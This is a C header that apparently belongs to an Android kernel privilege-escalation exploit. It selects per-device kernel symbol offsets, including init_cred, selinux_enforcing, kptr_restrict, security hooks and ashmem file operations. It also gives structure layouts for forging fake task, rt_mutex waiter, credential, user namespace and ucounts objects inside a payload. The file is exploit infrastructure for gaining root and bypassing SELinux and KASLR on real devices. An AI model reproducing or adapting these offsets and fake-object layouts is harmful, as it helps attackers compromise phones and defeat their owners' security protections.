#ifndef RUNTIME_STRUCT_OFFSETS_H
#define RUNTIME_STRUCT_OFFSETS_H

#include "../devices/offsets.h"

extern const struct kernel_offsets *active_offsets;

#define _RSO(field, fallback) (active_offsets && active_offsets->field ? active_offsets->field : (fallback))
#define _RSO_64(field, fallback) ((uint64_t)(active_offsets && active_offsets->field ? active_offsets->field : (fallback)))
#define _RSYM(field, fallback) ((uint64_t)(active_offsets ? active_offsets->field : (fallback)))

/* Address-space and mm-cache geometry.  These used to remain bound to the
 * reference device even after a different kernel profile was selected. */
#undef P0_PAGE_OFFSET
#undef DIRECT_MAP_BASE
#undef DIRECT_MAP_END
#undef VMEMMAP_START
#undef KERNELSNITCH_IDENTITY_START
#undef KERNELSNITCH_IDENTITY_END
#undef MM_STRUCT_SZ
#undef MM_ORDER

#define P0_PAGE_OFFSET _RSO_64(page_offset, 0xffffff8000000000ULL)
#define DIRECT_MAP_BASE _RSO_64(direct_map_base, 0xffffff8000000000ULL)
#define DIRECT_MAP_END _RSO_64(direct_map_end, 0xffffff9000000000ULL)
#define VMEMMAP_START _RSO_64(vmemmap_start, 0xfffffffe00000000ULL)
#define KERNELSNITCH_IDENTITY_START \
  _RSO_64(kernelsnitch_identity_start, 0xffffff8000000000ULL)
#define KERNELSNITCH_IDENTITY_END \
  _RSO_64(kernelsnitch_identity_end, 0xffffff8080000000ULL)
#define MM_STRUCT_SZ _RSO(mm_struct_size, 1024)
#define MM_ORDER _RSO(mm_slab_order, 2)

/* Symbol offsets and link-time text base must be selected in every
 * translation unit.  The original code only overrode them in main.c, leaving
 * util.c/fops.c pointed at the reference device. */
#undef KIMAGE_TEXT_BASE
#define KIMAGE_TEXT_BASE _RSO_64(kimage_text_base, 0xffffffc080000000ULL)

#undef INIT_TASK_OFF
#undef INIT_CRED_OFF
#undef INIT_UTS_NS_OFF
#undef EMPTY_ZERO_PAGE_OFF
#undef ROOT_TASK_GROUP_OFF
#undef SELINUX_ENFORCING_OFF
#undef KPTR_RESTRICT_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef CAP_CAPABLE_ACTIVE_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define INIT_TASK_OFF          _RSYM(off_init_task, 0x0240cf00ULL)
#define INIT_CRED_OFF          _RSYM(off_init_cred, 0x02422c70ULL)
#define INIT_UTS_NS_OFF        _RSYM(off_init_uts_ns, 0x02594d88ULL)
#define EMPTY_ZERO_PAGE_OFF    _RSYM(off_empty_zero_page, 0x02635000ULL)
#define ROOT_TASK_GROUP_OFF    _RSYM(off_root_task_group, 0x0263d580ULL)
#define SELINUX_ENFORCING_OFF  _RSYM(off_selinux_enforcing, 0x026894d0ULL)
#define KPTR_RESTRICT_OFF      _RSYM(off_kptr_restrict, 0x0240b638ULL)
#define SELINUX_BLOB_SIZES_OFF _RSYM(off_selinux_blob_sizes, 0x018464e8ULL)
#define SECURITY_HOOK_HEADS_OFF _RSYM(off_security_hook_heads, 0x01846480ULL)
#define KMALLOC_CACHES_OFF     _RSYM(off_kmalloc_caches, 0x018404c0ULL)
#define ANON_PIPE_BUF_OPS_OFF  _RSYM(off_anon_pipe_buf_ops, 0x0121ee48ULL)
#define ASHMEM_MISC_FOPS_OFF   _RSYM(off_ashmem_misc_fops, 0x0133b058ULL)
#define ASHMEM_FOPS_OFF        _RSYM(off_ashmem_fops, 0x026b6a98ULL)
#define ASHMEM_IOCTL_OFF       _RSYM(off_ashmem_ioctl, 0x00d85964ULL)
#define ASHMEM_COMPAT_IOCTL_OFF _RSYM(off_ashmem_compat_ioctl, 0x00d85834ULL)
#define ASHMEM_MMAP_OFF        _RSYM(off_ashmem_mmap, 0x00d858b0ULL)
#define ASHMEM_OPEN_OFF        _RSYM(off_ashmem_open, 0x00d854b4ULL)
#define ASHMEM_RELEASE_OFF     _RSYM(off_ashmem_release, 0x00d85a04ULL)
#define ASHMEM_SHOW_FDINFO_OFF _RSYM(off_ashmem_show_fdinfo, 0x00d8580cULL)
#define CONFIGFS_READ_ITER_OFF _RSYM(off_configfs_read_iter, 0x005154acULL)
#define CONFIGFS_BIN_WRITE_ITER_OFF _RSYM(off_configfs_bin_write_iter, 0x005156e0ULL)
#define COPY_SPLICE_READ_OFF   _RSYM(off_copy_splice_read, 0x00491578ULL)
#define NOOP_LLSEEK_OFF        _RSYM(off_noop_llseek, 0x0043e8f4ULL)
#define CAP_CAPABLE_ACTIVE_OFF _RSYM(off_cap_capable_active, 0x02683b30ULL)
#define SLIDE_NFULNL_LOGGER_OFF _RSYM(off_slide_nfulnl_logger, 0x024021a0ULL)
#define SLIDE_LOGGERS_0_1_OFF  _RSYM(off_slide_loggers_0_1, 0x024020f0ULL)
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF _RSYM(off_slide_boot_id, 0x026aa868ULL)
#define SLIDE_SYSCTL_BOOTID_OFF _RSYM(off_slide_boot_id, 0x026aa868ULL)

#undef SYSTEM_UNBOUND_WQ_OFF
#undef CALL_USERMODEHELPER_EXEC_WORK_OFF
#define SYSTEM_UNBOUND_WQ_OFF            _RSO_64(off_system_unbound_wq, 0)
#define CALL_USERMODEHELPER_EXEC_WORK_OFF _RSO_64(off_call_usermodehelper_exec_work, 0)

#undef FAKE_TASK_USAGE_OFF
#undef FAKE_TASK_CPU_OFF
#undef FAKE_TASK_PRIO_OFF
#undef FAKE_TASK_NORMAL_PRIO_OFF
#undef FAKE_TASK_TASK_GROUP_OFF
#undef FAKE_TASK_UCLAMP_REQ_OFF
#undef FAKE_TASK_UCLAMP_OFF
#undef FAKE_TASK_PI_LOCK_OFF
#undef FAKE_TASK_PI_WAITERS_OFF
#undef FAKE_TASK_PI_TOP_TASK_OFF
#undef FAKE_TASK_PI_BLOCKED_ON_OFF
#undef MM_OWNER_OFF
#undef TASK_PID_OFF
#undef TASK_TGID_OFF
#undef TASK_REAL_PARENT_OFF
#undef TASK_ATOMIC_FLAGS_OFF
#undef TASK_REAL_CRED_OFF
#undef TASK_CRED_OFF
#undef TASK_COMM_OFF
#undef TASK_TASKS_OFF
#undef TASK_SECCOMP_OFF

#define FAKE_TASK_USAGE_OFF          _RSO(task_usage, 0x40)
#define FAKE_TASK_CPU_OFF            _RSO(task_cpu, 0x58)
#define FAKE_TASK_PRIO_OFF           _RSO(task_prio, 0x94)
#define FAKE_TASK_NORMAL_PRIO_OFF    _RSO(task_normal_prio, 0x9C)
#define FAKE_TASK_TASK_GROUP_OFF     _RSO(task_sched_task_group, 0x420)
#define FAKE_TASK_UCLAMP_REQ_OFF     _RSO(task_uclamp_req, 0x350)
#define FAKE_TASK_UCLAMP_OFF         _RSO(task_uclamp, 0x358)
#define FAKE_TASK_PI_LOCK_OFF        _RSO(task_pi_lock, 0x9EC)
#define FAKE_TASK_PI_WAITERS_OFF     _RSO(task_pi_waiters, 0xA00)
#define FAKE_TASK_PI_TOP_TASK_OFF    _RSO(task_pi_top_task, 0xA10)
#define FAKE_TASK_PI_BLOCKED_ON_OFF  _RSO(task_pi_blocked_on, 0xA18)
#define MM_OWNER_OFF             _RSO(mm_owner, 0x410)
#define TASK_PID_OFF             _RSO(task_pid, 0x708)
#define TASK_TGID_OFF            _RSO(task_tgid, 0x70C)
#define TASK_REAL_PARENT_OFF     _RSO(task_real_parent, 0x718)
#define TASK_ATOMIC_FLAGS_OFF    _RSO(task_atomic_flags, 0x6C8)
#define TASK_REAL_CRED_OFF       _RSO(task_real_cred, 0x8F8)
#define TASK_CRED_OFF            _RSO(task_cred, 0x900)
#define TASK_COMM_OFF            _RSO(task_comm, 0x910)
#define TASK_TASKS_OFF           _RSO(task_tasks, 0x638)
#define TASK_SECCOMP_OFF         _RSO(task_seccomp, 0x9C8)

#undef FAKE_WAITER_PI_TREE_ENTRY_OFF
#undef FAKE_WAITER_TASK_OFF
#undef FAKE_WAITER_LOCK_OFF
#undef FAKE_WAITER_WAKE_STATE_OFF
#undef FAKE_WAITER_PRIO_OFF
#undef FAKE_WAITER_DEADLINE_OFF
#undef FAKE_WAITER_WW_CTX_OFF
#undef RT_MUTEX_WAITERS_OFF
#undef RT_MUTEX_OWNER_OFF
#define FAKE_WAITER_PI_TREE_ENTRY_OFF _RSO(waiter_pi_tree, 0x28)
#define FAKE_WAITER_TASK_OFF          _RSO(waiter_task, 0x50)
#define FAKE_WAITER_LOCK_OFF          _RSO(waiter_lock, 0x58)
#define FAKE_WAITER_WAKE_STATE_OFF    _RSO(waiter_wake_state, 0x60)
#define FAKE_WAITER_PRIO_OFF          _RSO(waiter_prio, 0x18)
#define FAKE_WAITER_DEADLINE_OFF      _RSO(waiter_deadline, 0x20)
#define FAKE_WAITER_WW_CTX_OFF        _RSO(waiter_ww_ctx, 0x68)
#define RT_MUTEX_WAITERS_OFF          _RSO(rt_mutex_waiters, 0x08)
#define RT_MUTEX_OWNER_OFF            _RSO(rt_mutex_owner, 0x18)

#undef STRUCT_PAGE_SIZE
#undef STRUCT_PAGE_COMPOUND_HEAD_OFF
#undef STRUCT_PAGE_TYPE_OFF
#undef STRUCT_SLAB_CACHE_OFF
#define STRUCT_PAGE_SIZE              _RSO(struct_page_size, 0x40)
#define STRUCT_PAGE_COMPOUND_HEAD_OFF _RSO(struct_page_compound_head, 0x08)
#define STRUCT_PAGE_TYPE_OFF          _RSO(struct_page_type, 0x30)
#define STRUCT_SLAB_CACHE_OFF         _RSO(struct_slab_cache, 0x08)

/* Exact fake-credential layout selected per profile. */
#undef CRED15_SIZE
#undef CRED15_USAGE_OFF
#undef CRED15_UID_OFF
#undef CRED15_GID_OFF
#undef CRED15_SUID_OFF
#undef CRED15_SGID_OFF
#undef CRED15_EUID_OFF
#undef CRED15_EGID_OFF
#undef CRED15_FSUID_OFF
#undef CRED15_FSGID_OFF
#undef CRED15_SECUREBITS_OFF
#undef CRED15_CAP_INH_OFF
#undef CRED15_CAP_PRM_OFF
#undef CRED15_CAP_EFF_OFF
#undef CRED15_CAP_BSET_OFF
#undef CRED15_CAP_AMB_OFF
#undef CRED15_SECURITY_OFF
#undef CRED15_USER_OFF
#undef CRED15_USER_NS_OFF
#undef CRED15_UCOUNTS_OFF
#undef CRED15_GROUP_INFO_OFF

#define CRED15_SIZE           _RSO(cred_size, 0xb0)
#define CRED15_USAGE_OFF      _RSO(cred_usage, 0x00)
#define CRED15_UID_OFF        _RSO(cred_uid, 0x04)
#define CRED15_GID_OFF        _RSO(cred_gid, 0x08)
#define CRED15_SUID_OFF       _RSO(cred_suid, 0x0c)
#define CRED15_SGID_OFF       _RSO(cred_sgid, 0x10)
#define CRED15_EUID_OFF       _RSO(cred_euid, 0x14)
#define CRED15_EGID_OFF       _RSO(cred_egid, 0x18)
#define CRED15_FSUID_OFF      _RSO(cred_fsuid, 0x1c)
#define CRED15_FSGID_OFF      _RSO(cred_fsgid, 0x20)
#define CRED15_SECUREBITS_OFF _RSO(cred_securebits, 0x24)
#define CRED15_CAP_INH_OFF    _RSO(cred_cap_inh, 0x28)
#define CRED15_CAP_PRM_OFF    _RSO(cred_cap_prm, 0x30)
#define CRED15_CAP_EFF_OFF    _RSO(cred_cap_eff, 0x38)
#define CRED15_CAP_BSET_OFF   _RSO(cred_cap_bset, 0x40)
#define CRED15_CAP_AMB_OFF    _RSO(cred_cap_amb, 0x48)
#define CRED15_SECURITY_OFF   _RSO(cred_security, 0x78)
#define CRED15_USER_OFF       _RSO(cred_user, 0x80)
#define CRED15_USER_NS_OFF    _RSO(cred_user_ns, 0x88)
#define CRED15_UCOUNTS_OFF    _RSO(cred_ucounts, 0x90)
#define CRED15_GROUP_INFO_OFF _RSO(cred_group_info, 0x98)

#undef TASK_SECURITY_SIZE
#undef TASK_SECURITY_OSID_OFF
#undef TASK_SECURITY_SID_OFF
#undef USER_STRUCT_SIZE
#undef USER_STRUCT_COUNT_OFF
#undef UCOUNTS_SIZE
#undef UCOUNTS_NS_OFF
#undef UCOUNTS_COUNT_OFF
#undef GROUP_INFO_USAGE_OFF
#undef GROUP_INFO_NGROUPS_OFF
#undef GROUP_INFO_GID_OFF
#undef USER_NS_SIZE
#undef USER_NS_GID_MAP_OFF
#undef USER_NS_PROJID_MAP_OFF
#undef USER_NS_NS_OFF
#undef USER_NS_UCOUNTS_OFF
#undef USER_NS_UCOUNT_MAX_OFF
#undef USER_NS_UCOUNT_MAX_COUNT
#undef NS_COMMON_COUNT_OFF
#undef UID_GID_MAP_SIZE
#undef UID_GID_MAP_NR_EXTENTS_OFF
#undef UID_GID_MAP_EXTENT_OFF
#undef FAKE_CRED_OFF
#undef FAKE_SEC_BLOB_OFF
#undef FAKE_USER_STRUCT_OFF
#undef FAKE_UCOUNTS_OFF
#undef FAKE_GROUP_INFO_OFF
#undef FAKE_USER_NS_OFF

#define TASK_SECURITY_SIZE       _RSO(task_security_size, 0x40)
#define TASK_SECURITY_OSID_OFF   _RSO(task_security_osid, 0x00)
#define TASK_SECURITY_SID_OFF    _RSO(task_security_sid, 0x04)
#define USER_STRUCT_SIZE         _RSO(user_struct_size, 0x80)
#define USER_STRUCT_COUNT_OFF    _RSO(user_struct_count, 0x00)
#define UCOUNTS_SIZE             _RSO(ucounts_size, 0x100)
#define UCOUNTS_NS_OFF           _RSO(ucounts_ns, 0x10)
#define UCOUNTS_COUNT_OFF        _RSO(ucounts_count, 0x1c)
#define GROUP_INFO_USAGE_OFF     _RSO(group_info_usage, 0x00)
#define GROUP_INFO_NGROUPS_OFF   _RSO(group_info_ngroups, 0x04)
#define GROUP_INFO_GID_OFF       _RSO(group_info_gid, 0x08)
#define USER_NS_SIZE             _RSO(user_ns_size, 0x100)
#define USER_NS_GID_MAP_OFF      _RSO(user_ns_gid_map, 0x40)
#define USER_NS_PROJID_MAP_OFF   _RSO(user_ns_projid_map, 0x80)
#define USER_NS_NS_OFF           _RSO(user_ns_ns, 0xd8)
#define USER_NS_UCOUNTS_OFF      _RSO(user_ns_ucounts, 0xf0)
#define USER_NS_UCOUNT_MAX_OFF   _RSO(user_ns_ucount_max, 0xf8)
#define USER_NS_UCOUNT_MAX_COUNT _RSO(user_ns_ucount_max_count, 1)
#define NS_COMMON_COUNT_OFF      _RSO(ns_common_count, 0x14)
#define UID_GID_MAP_SIZE         _RSO(uid_gid_map_size, 0x40)
#define UID_GID_MAP_NR_EXTENTS_OFF _RSO(uid_gid_map_nr_extents, 0x00)
#define UID_GID_MAP_EXTENT_OFF   _RSO(uid_gid_map_extent, 0x04)

#define FAKE_CRED_OFF        _RSO(payload_fake_cred, 0x0e00)
#define FAKE_SEC_BLOB_OFF    _RSO(payload_fake_security, 0x0ec0)
#define FAKE_USER_STRUCT_OFF _RSO(payload_fake_user, 0x0f00)
#define FAKE_UCOUNTS_OFF     _RSO(payload_fake_ucounts, 0x0f80)
#define FAKE_GROUP_INFO_OFF  _RSO(payload_fake_group_info, 0x0db0)
#define FAKE_USER_NS_OFF     _RSO(payload_fake_user_ns, 0x1200)

/* file_operations struct field offsets are profile-selected too.  In
 * particular, layouts with and without fop_flags shift several fields. */
#undef FOPS_LLSEEK_OFF
#undef FOPS_READ_OFF
#undef FOPS_WRITE_OFF
#undef FOPS_READ_ITER_OFF
#undef FOPS_WRITE_ITER_OFF
#undef FOPS_IOCTL_OFF
#undef FOPS_COMPAT_IOCTL_OFF
#undef FOPS_MMAP_OFF
#undef FOPS_OPEN_OFF
#undef FOPS_RELEASE_OFF
#undef FOPS_SPLICE_READ_OFF
#undef FOPS_SHOW_FDINFO_OFF

#define FOPS_LLSEEK_OFF       _RSO(fops_llseek, 0x10)
#define FOPS_READ_OFF         _RSO(fops_read, 0x18)
#define FOPS_WRITE_OFF        _RSO(fops_write, 0x20)
#define FOPS_READ_ITER_OFF    _RSO(fops_read_iter, 0x28)
#define FOPS_WRITE_ITER_OFF   _RSO(fops_write_iter, 0x30)
#define FOPS_IOCTL_OFF        _RSO(fops_ioctl, 0x50)
#define FOPS_COMPAT_IOCTL_OFF _RSO(fops_compat_ioctl, 0x58)
#define FOPS_MMAP_OFF         _RSO(fops_mmap, 0x60)
#define FOPS_OPEN_OFF         _RSO(fops_open, 0x68)
#define FOPS_RELEASE_OFF      _RSO(fops_release, 0x78)
#define FOPS_SPLICE_READ_OFF  _RSO(fops_splice_read, 0xb8)
#define FOPS_SHOW_FDINFO_OFF  _RSO(fops_show_fdinfo, 0xd8)

#endif
